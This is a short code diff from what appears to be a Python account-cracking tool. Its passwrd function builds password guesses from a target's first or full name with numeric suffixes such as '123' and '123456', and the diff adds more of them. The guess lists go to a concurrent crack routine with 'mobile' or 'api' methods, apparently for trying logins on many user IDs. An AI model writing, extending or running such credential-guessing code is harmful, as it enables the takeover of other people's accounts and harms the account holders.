@@ -513,17 +513,21 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.validate(frs+'123')
-					pwv.validate(frs+'1234')
-					pwv.validate(frs+'12345')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'12')
 			else:
 				if len(frs)<3:
-					pwv.validate(nmf)
+					pwv.append(nmf)
 				else:
-					pwv.validate(nmf)
-					pwv.validate(frs+'123')
-					pwv.validate(frs+'1234')
-					pwv.validate(frs+'12345')
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'12')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'api' in method:
